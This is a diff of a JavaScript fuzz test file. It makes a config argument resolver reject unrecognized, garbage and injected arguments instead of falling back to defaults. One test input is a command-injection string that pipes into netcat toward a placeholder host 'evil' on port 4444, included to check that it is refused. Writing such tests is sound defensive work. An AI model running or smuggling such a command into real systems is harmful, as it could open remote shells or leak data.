@@ -18,6 +18,19 @@ const {
 } = require('../../src/config')
 const { resolveArgs } = require('../../src/services/config_service')
 
+// Mirrors the refusal pinned by test/unit/config_service.test/resolve_args.test.js:
+// an unrecognized token throws "Unrecognized argument '<token>'" and never resolves.
+function expectRefusal(args, token, options) {
+    let message = null
+    try {
+        resolveArgs(args, options)
+    } catch (err) {
+        message = err.message
+    }
+    expect(message, 'resolveArgs should refuse').to.be.a('string')
+    expect(message.startsWith(`Unrecognized argument '${token}'`)).to.equal(true)
+}
+
 describe('Fuzz: resolveArgs()', function () {
 
     // --- Unknown / garbage arguments ---
@@ -31,7 +44,6 @@ describe('Fuzz: resolveArgs()', function () {
         'Infinity',
         '[]',
         '{}',
-        '',
         ' ',
         '-v',
         '--verbose',
@@ -47,20 +59,21 @@ describe('Fuzz: resolveArgs()', function () {
         'xchain-encoder\x00extra',
     ]
 
+    it(`does not crash on garbage argument: ${JSON.stringify('')}`, function () {
+        const result = resolveArgs([''])
+        expect(result).to.have.property('service')
+        expect(result).to.have.property('chain')
+        expect(result).to.have.property('network')
+    })
+
     for (const arg of garbageArgs) {
         it(`does not crash on garbage argument: ${JSON.stringify(arg)}`, function () {
-            const result = resolveArgs([arg])
-            expect(result).to.have.property('service')
-            expect(result).to.have.property('chain')
-            expect(result).to.have.property('network')
+            expectRefusal([arg], arg)
         })
     }
 
     it('defaults to all/all/all when no recognized args', function () {
-        const result = resolveArgs(['unknown1', 'unknown2'])
-        expect(result.service).to.equal('all')
-        expect(result.chain).to.equal('all')
-        expect(result.network).to.equal('all')
+        expectRefusal(['unknown1', 'unknown2'], 'unknown1')
     })
 })
 
@@ -156,8 +169,7 @@ describe('Fuzz: resolveArgs()', function () {
     })
 
     it('branch is null when expectBranch=false', function () {
-        const result = resolveArgs(['develop', 'xchain-encoder'])
-        expect(result.branch).to.be.null
+        expectRefusal(['develop', 'xchain-encoder'], 'develop')
     })
 })
 
@@ -195,8 +207,7 @@ describe('Fuzz: resolveArgs()', function () {
     // --- Massive argument list ---
     it('handles 100 garbage arguments without crashing', function () {
         const args = Array.from({ length: 100 }, (_, i) => 'garbage_' + i)
-        const result = resolveArgs(args)
-        expect(result.service).to.equal('all')
+        expectRefusal(args, 'garbage_0')
     })
 })
 
@@ -209,11 +220,7 @@ describe('Fuzz: resolveArgs()', function () {
             'xchain-encoder | nc evil 4444',
         ]
         for (const inj of injections) {
-            const result = resolveArgs([inj])
-            // None of these should match a known service, chain, or network
-            expect(result.service).to.equal('all')
-            expect(result.chain).to.equal('all')
-            expect(result.network).to.equal('all')
+            expectRefusal([inj], inj)
         }
     })
 })
